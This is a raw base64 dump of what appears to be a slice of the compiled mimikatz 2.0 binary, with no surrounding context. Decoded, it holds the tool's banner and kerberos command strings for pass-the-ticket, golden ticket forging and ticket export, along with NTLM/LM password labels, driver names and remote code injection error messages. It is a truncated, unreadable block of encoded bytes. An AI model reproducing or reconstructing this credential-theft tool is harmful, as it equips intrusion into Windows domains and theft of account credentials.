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AgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoAF8AZwBlAG4AZQByAGkAYwBQAHIAbwBjAGUAcwBzAE8AcgBTAGUAcgB2AGkAYwBlAEYAcgBvAG0AQgB1AGkAbABkACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaABfAGcAZQBuAGUAcgBpAGMAUAByAG8AYwBlAHMAcwBPAHIAUwBlAHIAdgBpAGMAZQBGAHIAbwBtAEIAdQBpAGwAZAAgADsAIABTAGUAcgB2AGkAYwBlACAAaQBzACAAbgBvAHQAIAByAHUAbgBuAGkAbgBnAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AZwBlAHQAVQBuAGkAcQB1AGUARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAASQBuAGMAbwByAHIAZQBjAHQAIAB2AGUAcgBzAGkAbwBuACAAaQBuACAAcgBlAGYAZQByAGUAbgBjAGUAcwAKAAAAAABRAFcATwBSAEQAAAAAAAAAUgBFAFMATwBVAFIAQwBFAF8AUgBFAFEAVQBJAFIARQBNAEUATgBUAFMAXwBMAEkAUwBUAAAAAABGAFUATABMAF8AUgBFAFMATwBVAFIAQwBFAF8ARABFAFMAQwBSAEkAUABUAE8AUgAAAAAAAAAAAFIARQBTAE8AVQBSAEMARQBfAEwASQBTAFQAAAAAAAAATQBVAEwAVABJAF8AUwBaAAAAAAAAAAAATABJAE4ASwAAAAAAAAAAAEQAVwBPAFIARABfAEIASQBHAF8ARQBOAEQASQBBAE4AAAAAAAAAAABEAFcATwBSAEQAAAAAAAAAQgBJAE4AQQBSAFkAAAAAAEUAWABQAEEATgBEAF8AUwBaAAAAUwBaAAAAAAAAAAAATgBPAE4ARQAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBjAHIAZQBhAHQAZQAgADsAIABSAHQAbABDAHIAZQBhAHQAZQBVAHMAZQByAFQAaAByAGUAYQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAGUAbQBvAHQAZQBsAGkAYgBfAGMAcgBlAGEAdABlACAAOwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABUAGgAIABAACAAJQBwAAoARABhACAAQAAgACUAcAAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AYwByAGUAYQB0AGUAIAA7ACAAawB1AGwAbABfAG0AXwBrAGUAcgBuAGUAbABfAGkAbwBjAHQAbABfAGgAYQBuAGQAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AQwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAQwBvAGQAZQBXAGkAdAB0AGgAUABhAHQAdABlAHIAbgBSAGUAcABsAGEAYwBlACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBjAG8AcAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AQwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAQwBvAGQAZQBXAGkAdAB0AGgAUABhAHQAdABlAHIAbgBSAGUAcABsAGEAYwBlACAAOwAgAGsAdQBsAGwAXwBtAF8AbQBlAG0AbwByAHkAXwBhAGwAbABvAGMAIAAvACAAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKABFAHgAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBDAHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBDAG8AZABlAFcAaQB0AHQAaABQAGEAdAB0AGUAcgBuAFIAZQBwAGwAYQBjAGUAIAA7ACAATgBvACAAYgB1AGYAZgBlAHIAIAA/AAoAAAAAAAAAUwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAAAAAABcAHgAJQAwADIAeAAAAAAAMAB4ACUAMAAyAHgALAAgAAAAAAAAAAAAJQAwADIAeAAgAAAAAAAAACUAMAAyAHgAAAAAAAoAAAAlAHMAIAAAACUAcwAAAAAAJQB3AFoAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcwB0AHIAaQBuAGcAXwBkAGkAcwBwAGwAYQB5AFMASQBEACAAOwAgAEMAbwBuAHYAZQByAHQAUwBpAGQAVABvAFMAdAByAGkAbgBnAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABUAG8AawBlAG4AAAAAAAAAAAAAAAAAAAAKACAAIAAuACMAIwAjACMAIwAuACAAIAAgAG0AaQBtAGkAawBhAHQAegAgADIALgAwACAAYQBsAHAAaABhACAAKAB4ADYANAApACAAcgBlAGwAZQBhAHMAZQAgACIASwBpAHcAaQAgAGUAbgAgAEMAIgAgACgARgBlAGIAIAAxADYAIAAyADAAMQA1ACAAMgAyADoAMQA1ADoAMgA4ACkACgAgAC4AIwAjACAAXgAgACMAIwAuACAAIAAKACAAIwAjACAALwAgAFwAIAAjACMAIAAgAC8AKgAgACoAIAAqAAoAIAAjACMAIABcACAALwAgACMAIwAgACAAIABCAGUAbgBqAGEAbQBpAG4AIABEAEUATABQAFkAIABgAGcAZQBuAHQAaQBsAGsAaQB3AGkAYAAgACgAIABiAGUAbgBqAGEAbQBpAG4AQABnAGUAbgB0AGkAbABrAGkAdwBpAC4AYwBvAG0AIAApAAoAIAAnACMAIwAgAHYAIAAjACMAJwAgACAAIA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ByAGIAZQByAG8AcwBfAHAAdAB0AF8AZgBpAGwAZQAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwByAGUAYQBkAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB0AHQAXwBkAGEAdABhACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFMAdQBiAG0AaQB0AFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAAvACAAUABhAGMAawBhAGcAZQAgADoAIAAlADAAOAB4AAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdAB0AF8AZABhAHQAYQAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBTAHUAYgBtAGkAdABUAGkAYwBrAGUAdABNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAABUAGkAYwBrAGUAdAAoAHMAKQAgAHAAdQByAGcAZQAgAGYAbwByACAAYwB1AHIAcgBlAG4AdAAgAHMAZQBzAHMAaQBvAG4AIABpAHMAIABPAEsACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdQByAGcAZQAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBQAHUAcgBnAGUAVABpAGMAawBlAHQAQwBhAGMAaABlAE0AZQBzAHMAYQBnAGUAIAAvACAAUABhAGMAawBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB1AHIAZwBlACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFAAdQByAGcAZQBUAGkAYwBrAGUAdABDAGEAYwBoAGUATQBlAHMAcwBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAEsAZQByAGIAZQByAG8AcwAgAFQARwBUACAAbwBmACAAYwB1AHIAcgBlAG4AdAAgAHMAZQBzAHMAaQBvAG4AIAA6ACAAAAAAAAAAAAAAAAAACgAKAAkAKgAqACAAUwBlAHMAcwBpAG8AbgAgAGsAZQB5ACAAaQBzACAATgBVAEwATAAhACAASQB0ACAAbQBlAGEAbgBzACAAYQBsAGwAbwB3AHQAZwB0AHMAZQBzAHMAaQBvAG4AawBlAHkAIABpAHMAIABuAG8AdAAgAHMAZQB0ACAAdABvACAAMQAgACoAKgAKAAAAAABuAG8AIAB0AGkAYwBrAGUAdAAgACEACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwB0AGcAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBSAGUAdAByAGkAZQB2AGUAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AdABnAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUgBlAHQAcgBpAGUAdgBlAFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAABlAHgAcABvAHIAdAAAAAAACgBbACUAMAA4AHgAXQAgAC0AIAAwAHgAJQAwADgAeAAgAC0AIAAlAHMAAAAAAAAACgAgACAAIABTAHQAYQByAHQALwBFAG4AZAAvAE0AYQB4AFIAZQBuAGUAdwA6ACAAAAAAAAAAAAAgADsAIAAAAAAAAAAAAAAACgAgACAAIABTAGUAcgB2AGUAcgAgAE4AYQBtAGUAIAAgACAAIAAgACAAIAA6ACAAJQB3AFoAIABAACAAJQB3AFoAAAAAAAAAAAAAAAAAAAAKACAAIAAgAEMAbABpAGUAbgB0ACAATgBhAG0AZQAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAgAEAAIAAlAHcAWgAAAAAAAAAKACAAIAAgAEYAbABhAGcAcwAgACUAMAA4AHgAIAAgACAAIAA6ACAAAAAAAAAAAABrAGkAcgBiAGkAAAAAAAAACgAgACAAIAAqACAAUwBhAHYAZQBkACAAdABvACAAZgBpAGwAZ